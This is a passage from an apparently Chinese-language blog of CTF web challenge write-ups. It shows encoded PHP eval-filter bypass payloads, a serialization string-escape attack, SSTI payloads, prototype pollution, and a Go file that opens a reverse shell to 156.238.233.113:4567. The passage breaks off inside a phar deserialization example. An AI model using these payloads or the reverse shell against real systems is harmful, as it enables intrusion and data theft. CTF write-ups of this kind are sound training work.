class="line"></span><br><span class="line"><span class="keyword">if</span> ( <span class="title function_ invoke__">strlen</span>(<span class="title function_ invoke__">count_chars</span>(<span class="title function_ invoke__">strtolower</span>(<span class="variable">$_</span>), <span class="number">0x3</span>)) &gt; <span class="number">0xd</span> )</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;you are so close, omg&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$_</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>绕过两个if即可实现命令执行</p><p>首先看看过滤的东西：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\x00-\x20，0-1，&#x27;&quot;`$&amp;.,|[]&#123;_defgops&#125;+和\x7F</span><br></pre></td></tr></table></figure><p>再看下面的if，count_chars第二个参数为3，</p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241218143940345.png" alt="image-20241218143940345" style="zoom:67%;" /><p>也就是不能使用超过13种字符！、</p><p>接下来，有一种办法可以看我们到底可以用哪些内置函数！！！好办法！</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$array</span>=<span class="title function_ invoke__">get_defined_functions</span>();</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$array</span>[<span class="string">&#x27;internal&#x27;</span>] <span class="keyword">as</span> <span class="variable">$arr</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[\x00- 0-9\&#x27;&quot;`$&amp;.,|[&#123;_defgops\x7F]+/i&#x27;</span>, <span class="variable">$arr</span>) )<span class="keyword">continue</span>;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="title function_ invoke__">strlen</span>(<span class="title function_ invoke__">count_chars</span>(<span class="title function_ invoke__">strtolower</span>(<span class="variable">$_</span>), <span class="number">0x3</span>)) &gt; <span class="number">0xd</span> )<span class="keyword">continue</span>;</span><br><span class="line">    <span class="keyword">print</span>(<span class="variable">$arr</span>.<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241218144520020.png" alt="image-20241218144520020"></p><p>获取可用函数</p><p>但是我们没有发现可供我们使用的函数，该怎么办呢？</p><p>我们接着看过滤，发现异或，取反之类的没有被过滤，可以考虑用他们来绕过。</p><p>尝试取反</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo urlencode(~(&#x27;phpinfo&#x27;));</span><br><span class="line">//%8F%97%8F%96%91%99%90</span><br></pre></td></tr></table></figure><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241218150653705.png" alt="image-20241218150653705"></p><p>成功执行phpinfo</p><p>接下来我们可以看看disable function</p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241218150726126.png" alt="image-20241218150726126"></p><p>print_r()，scandir()之类的可以用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">echo urlencode(~(&#x27;print_r&#x27;));</span><br><span class="line">//%8F%8D%96%91%8B%A0%8D</span><br><span class="line">echo urlencode(~(&#x27;scandir&#x27;));</span><br><span class="line">//%8C%9C%9E%91%9B%96%8D</span><br><span class="line">echo urlencode(~(&#x27;.&#x27;));</span><br><span class="line">//%D1</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(~%8F%8D%96%91%8B%A0%8D)((~%8C%9C%9E%91%9B%96%8D)(~%D1));</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">((%8f%8d%96%91%8b%a0%8d)^(%ff%ff%ff%ff%ff%ff%ff))(((%8c%9c%9e%91%9b%96%8d)^(%ff%ff%ff%ff%ff%ff%ff))(%d1^%ff));</span><br></pre></td></tr></table></figure><p>这里总共15个字符，超过了两个</p><p>但是这里字符种类超过限制，脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">en</span>(<span class="params">s</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">hex</span>(<span class="built_in">ord</span>(s) ^ <span class="number">0xff</span>)[<span class="number">2</span>:]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = <span class="built_in">list</span>(<span class="built_in">set</span>(<span class="string">&#x27;printrscandir&#x27;</span>))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> p:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> p:</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> p:</span><br><span class="line">            <span class="keyword">for</span> m <span class="keyword">in</span> p:</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">ord</span>(j) ^ <span class="built_in">ord</span>(k) ^ <span class="built_in">ord</span>(m) == <span class="built_in">ord</span>(i):</span><br><span class="line">                    <span class="keyword">if</span>(j == k <span class="keyword">or</span> j == m <span class="keyword">or</span> m == k):</span><br><span class="line">                        <span class="keyword">continue</span></span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        <span class="built_in">print</span>(i+<span class="string">&#x27;==&#x27;</span>+j + <span class="string">&#x27;^&#x27;</span> + k + <span class="string">&#x27;^&#x27;</span>+m, end=<span class="string">&#x27;\t&#x27;</span>)</span><br><span class="line">                        <span class="built_in">print</span>(</span><br><span class="line">                            <span class="string">&#x27;&#123;:0&gt;2&#125;  =&gt;  [&quot;&#123;:0&gt;2&#125;&quot;,&quot;&#123;:0&gt;2&#125;&quot;,&quot;&#123;:0&gt;2&#125;&quot;]&#x27;</span>.<span class="built_in">format</span>(</span><br><span class="line">                                en(i), en(j), en(k), en(m)))</span><br><span class="line">                        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">n==d^i^c91  =&gt;  [&quot;9b&quot;,&quot;96&quot;,&quot;9c&quot;]</span><br><span class="line">p==r^a^c8f  =&gt;  [&quot;8d&quot;,&quot;9e&quot;,&quot;9c&quot;]</span><br><span class="line">t==d^s^c8b  =&gt;  [&quot;9b&quot;,&quot;8c&quot;,&quot;9c&quot;]</span><br></pre></td></tr></table></figure><p>print_r(scandir(‘.’))</p><p>往下变：以下两种都行，可以构造很多很多种，替换哪种都没事！</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">((%8f%8d%96%96%8b%a0%8d)^(%ff%ff%ff%ff%ff%ff%ff)^(%ff%ff%ff%8c%ff%ff%ff)^(%ff%ff%ff%8b%ff%ff%ff))(((%8c%9c%9c%96%8c%96%8d)^(%ff%ff%ff%ff%ff%ff%ff)^(%ff%ff%8f%8c%9c%ff%ff)^(%ff%ff%8d%8b%8b%ff%ff))(%d1^%ff));</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">((%8d%8d%96%9b%9b%a0%8d)^(%9e%ff%ff%96%8c%ff%ff)^(%9c%ff%ff%9c%9c%ff%ff)^(%ff%ff%ff%ff%ff%ff%ff))(((%8c%9c%9e%9b%9b%96%8d)^(%ff%ff%ff%96%ff%ff%ff)^(%ff%ff%ff%9c%ff%ff%ff)^(%ff%ff%ff%ff%ff%ff%ff))(%d1^%ff));</span><br></pre></td></tr></table></figure><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241218164943899.png" alt="image-20241218164943899"></p><p>想要读取的话</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">readfile(end(scandir(&#x27;.&#x27;)))</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">((%8D%9A%9E%9B%99%96%93%9A)^(%ff%ff%ff%ff%ff%ff%ff))</span><br><span class="line">((%9A%91%9B)^(%ff%ff%ff))</span><br><span class="line">((%8C%9C%9E%91%9B%96%8D)^(%ff%ff%ff%ff%ff%ff%ff))</span><br><span class="line">((%D1)^(%ff))</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">d==l^a^i9b  =&gt;  [&quot;93&quot;,&quot;9e&quot;,&quot;96&quot;]</span><br><span class="line">i==f^n^a96  =&gt;  [&quot;99&quot;,&quot;91&quot;,&quot;9e&quot;]</span><br><span class="line">c==a^l^n9c  =&gt;  [&quot;9e&quot;,&quot;93&quot;,&quot;91&quot;]</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">((%8c%9a%9e%9b%9c%96%93%9a)^(%ff%ff%ff%ff%ff%ff%ff%ff)^(%9b%ff%ff%ff%93%ff%ff%ff)^(%9a%ff%ff%ff%96%ff%ff%ff))(((%9a%9c%9b)^(%ff%ff%ff)^(%ff%93%ff)^(%ff%9e%ff))(((%8c%9c%9e%9c%9b%96%8c)^(%ff%ff%ff%ff%ff%ff%ff)^(%ff%ff%ff%93%ff%ff%9b)^(%ff%ff%ff%9e%ff%ff%9a))(%d1^%ff)));</span><br></pre></td></tr></table></figure><h2 id="安洵杯-2019-easy-serialize-php"><a href="#安洵杯-2019-easy-serialize-php" class="headerlink" title="[安洵杯 2019]easy_serialize_php"></a>[安洵杯 2019]easy_serialize_php</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$function</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$img</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$filter_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;php5&#x27;</span>,<span class="string">&#x27;php4&#x27;</span>,<span class="string">&#x27;fl1g&#x27;</span>);</span><br><span class="line">    <span class="variable">$filter</span> = <span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">implode</span>(<span class="string">&#x27;|&#x27;</span>,<span class="variable">$filter_arr</span>).<span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$filter</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$img</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>)&#123;</span><br><span class="line">    <span class="keyword">unset</span>(<span class="variable">$_SESSION</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;user&quot;</span>] = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;function&#x27;</span>] = <span class="variable">$function</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_POST</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$function</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;a href=&quot;index.php?f=highlight_file&quot;&gt;source_code&lt;/a&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$_GET</span>[<span class="string">&#x27;img_path&#x27;</span>])&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = <span class="title function_ invoke__">base64_encode</span>(<span class="string">&#x27;guest_img.png&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = <span class="title function_ invoke__">sha1</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;img_path&#x27;</span>]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$serialize_info</span> = <span class="title function_ invoke__">filter</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$_SESSION</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;highlight_file&#x27;</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;phpinfo&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;phpinfo();&#x27;</span>); <span class="comment">//maybe you can find something in here!</span></span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;show_image&#x27;</span>)&#123;</span><br><span class="line">    <span class="variable">$userinfo</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$serialize_info</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$userinfo</span>[<span class="string">&#x27;img&#x27;</span>]));</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>这里不太清楚这个序列化后是长啥样的，本地跑一下看看。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:3:&#123;s:4:&quot;user&quot;;s:5:&quot;guest&quot;;s:8:&quot;function&quot;;s:5:&quot;b1234&quot;;s:3:&quot;img&quot;;s:40:&quot;da39a3ee5e6b4b0d3255bfef95601890afd80709&quot;;&#125;</span><br></pre></td></tr></table></figure><p>这个sha1是需要绕过的！</p><p>但是这要咋绕啊？发现有个filter会过滤掉字符串，可以考虑字符串逃逸，把img逃逸出来，我们可以自己构造！</p><p>存在extract($_POST);变量覆盖！</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$_SESSION[&quot;user&quot;] = &#x27;guest&#x27;;</span><br><span class="line">$_SESSION[&#x27;function&#x27;] = $function;</span><br></pre></td></tr></table></figure><p>这俩都是可控的。</p><p>function可控，我们在里面弄img然后闭合就行，那么我们用user来进行逃逸，吞掉<code>&quot;;s:8:&quot;function&quot;;s:xx:&quot;</code>，23个字符。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flagflagflagflagflagphp</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;s:1:&quot;a&quot;;s:1:&quot;a&quot;;&#125;</span><br></pre></td></tr></table></figure><p>有个hint就是d0g3_f1ag.php</p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241220124913426.png" alt="image-20241220124913426" style="zoom:80%;" /><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241220124906163.png" alt="image-20241220124906163" style="zoom:80%;" /><p>ok拿捏了。&#x2F;d0g3_fllllllag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;;s:3:&quot;img&quot;;s:20:&quot;L2QwZzNfZmxsbGxsbGFn&quot;;s:1:&quot;a&quot;;s:1:&quot;a&quot;;&#125;</span><br></pre></td></tr></table></figure><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241220125010556.png" alt="image-20241220125010556" style="zoom:80%;" /><p>NSSCTF{eb4bcc79-d54c-4437-af0a-d13b88c05373}</p><h2 id="护网杯-2018-easy-tornado"><a href="#护网杯-2018-easy-tornado" class="headerlink" title="[护网杯 2018]easy_tornado"></a>[护网杯 2018]easy_tornado</h2><p>打开页面有三个超链接，集成一下信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">/welcome.txt</span><br><span class="line">fa7aa3ea2a63d3e3f984fc2f952b9d95</span><br><span class="line"></span><br><span class="line">/hints.txt</span><br><span class="line">9dd148c6b068df197ef0c4d592565839</span><br><span class="line"></span><br><span class="line">/flag.txt</span><br><span class="line">7f5f6f0a3e742f57e0c66c6e2989e494</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">md5(cookie_secret+md5(filename))</span><br><span class="line"></span><br><span class="line">/fllllllllllllag</span><br></pre></td></tr></table></figure><p>我们需要获取cookie_secret的值</p><p>而我们查官方文档，tornado在搭建一个网站时，肯定会有多个handler，而这些handler都是RequestHandler的子类</p><p>RequestHandler.settings又指向self.application.settings</p><p>所以我们可以说handler.settings指向了RequestHandler.settings了，对吧</p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241220205948150.png" alt="image-20241220205948150"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">128f7343-bd58-429c-80c6-c72b604e2aaf</span><br></pre></td></tr></table></figure><p>然后验证一下，用flag.txt</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/flag.txt md5 =&gt; 40dfb7391c19a66939e6b6f4e9898804</span><br><span class="line">2f02cee7-4944-4208-9af2-fae3dad9ce3740dfb7391c19a66939e6b6f4e9898804</span><br><span class="line">9c2b962c16d37c4d7e8d2731f5d589b4</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">2f02cee7-4944-4208-9af2-fae3dad9ce373bf9f6cf685a6dd8defadabfb41a03a1</span><br><span class="line">256ccf8b76c09059ce6fa48edd653af9</span><br></pre></td></tr></table></figure><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241220210832925.png" alt="image-20241220210832925"></p><h2 id="BJDCTF-2020-Cookie-is-so-subtle"><a href="#BJDCTF-2020-Cookie-is-so-subtle" class="headerlink" title="[BJDCTF 2020]Cookie is so subtle!"></a>[BJDCTF 2020]Cookie is so subtle!</h2><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241221130223596.png" alt="image-20241221130223596"></p><p>flag界面存在ssti，是twig模板引擎的ssti</p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241221130251349.png" alt="image-20241221130251349" style="zoom: 67%;" /><p>发现他会把username的值设置为cookie！</p><p>同时页面也会回显123.</p><p>cookie处可能存在ssti</p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241221131100031.png" alt="image-20241221131100031" style="zoom: 67%;" /><p>实锤了，想办法看其他目录</p><p>这里想了半天，突然想起来，ls &#x2F;是一列一列输出的，所以这里只输出了第一行，我们让他成行输出即可！</p><p>刚开始试了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -m /   不太行，只有几个</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls / | xargs   可以</span><br></pre></td></tr></table></figure><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241221132103107.png" alt="image-20241221132103107" style="zoom:67%;" /><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241221132132933.png" alt="image-20241221132132933" style="zoom:67%;" /><h2 id="NSSRound-8-Basic-Upload-gogoggo"><a href="#NSSRound-8-Basic-Upload-gogoggo" class="headerlink" title="[NSSRound#8 Basic]Upload_gogoggo"></a>[NSSRound#8 Basic]Upload_gogoggo</h2><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241221210444624.png" alt="image-20241221210444624"></p><p>就一个文件上传的功能点，上传试试</p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241221210459298.png" alt="image-20241221210459298" style="zoom: 67%;" /><p>这波….</p><p>go webshell？？go help？？？这是用go执行了我的文件名吗？</p><p>上传文件名为help试试</p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241221210551031.png" alt="image-20241221210551031" style="zoom: 67%;" /><p>这是？？</p><p>命令执行(go 文件名前缀 文件上传的路径)？</p><p>能不能让他go run go文件</p><p>go run run.go？？</p><p>可以吗？</p><p>run.go文件如下：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;log&quot;</span></span><br><span class="line"><span class="string">&quot;os/exec&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">cmd := exec.Command(<span class="string">&quot;bash&quot;</span>, <span class="string">&quot;-c&quot;</span>,<span class="string">&quot;bash -i &gt;&amp; /dev/tcp/156.238.233.113/4567 0&gt;&amp;1&quot;</span>)</span><br><span class="line">out, err := cmd.CombinedOutput()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        fmt.Printf(<span class="string">&quot;combined out:\n%s\n&quot;</span>, <span class="type">string</span>(out))</span><br><span class="line">log.Fatalf(<span class="string">&quot;cmd.Run() failed with %s\n&quot;</span>, err)</span><br><span class="line">&#125;</span><br><span class="line">fmt.Printf(<span class="string">&quot;combined out:\n%s\n&quot;</span>, <span class="type">string</span>(out))</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>直接弹shell</p><p>根目录下有个flaaaag   TlNTQ1QK</p><p>&#x2F;home&#x2F;galf    RntmY2ZjYjIwNS1kZjFhLTQ2NWYtODMzOC0wYzRhMjM2MDEzNmF9Cg&#x3D;&#x3D;</p><p>抽象</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NSSCTF&#123;fcfcb205-df1a-465f-8338-0c4a2360136a&#125;</span><br></pre></td></tr></table></figure><h2 id="MoeCTF-2021-fake-game"><a href="#MoeCTF-2021-fake-game" class="headerlink" title="[MoeCTF 2021]fake game"></a>[MoeCTF 2021]fake game</h2><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241222093337918.png" alt="image-20241222093337918"></p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241222093344765.png" alt="image-20241222093344765"></p><p>随便发个包，正常分配属性肯定是不行的。</p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241222093408857.png" alt="image-20241222093408857" style="zoom: 67%;" /><p>提示merge，原型链污染。</p><p>如果你将某一项属性值设为0，你将没有这项属性！</p><p>那么污染proto，当前找不到就找之前的，完美了。</p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241222093449718.png" alt="image-20241222093449718" style="zoom:67%;" /><h2 id="NSSRound-13-Basic-ez-factors"><a href="#NSSRound-13-Basic-ez-factors" class="headerlink" title="[NSSRound#13 Basic]ez_factors"></a>[NSSRound#13 Basic]ez_factors</h2><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241222102504323.png" alt="image-20241222102504323"></p><p>因数分解</p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241222102518573.png" alt="image-20241222102518573"></p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241222102526079.png" alt="image-20241222102526079"></p><p>发现只能输出数字。</p><p>那就用od，输出八进制</p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241222102639428.png" alt="image-20241222102639428"></p><h2 id="NSSRound-4-SWPU-1zweb-revenge"><a href="#NSSRound-4-SWPU-1zweb-revenge" class="headerlink" title="[NSSRound#4 SWPU]1zweb(revenge)"></a>[NSSRound#4 SWPU]1zweb(revenge)</h2><p>一道phar反序列化题，但是跟之前做的不太一样</p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241222111208334.png" alt="image-20241222111208334"></p><p>有两个功能点</p><p>存在任意文件读取，先读取index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LoveNss</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ljt</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$dky</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;ljt=<span class="string">&quot;ljt&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;dky=<span class="string">&quot;dky&quot;</span>;</span><br><span class="line">        <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;ljt===<span class="string">&quot;Misc&quot;</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;dky===<span class="string">&quot;Re&quot;</span>)</span><br><span class="line">            <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;cmd);</span><br><span class="line">    &#125;</span><br><span class="line">    <span 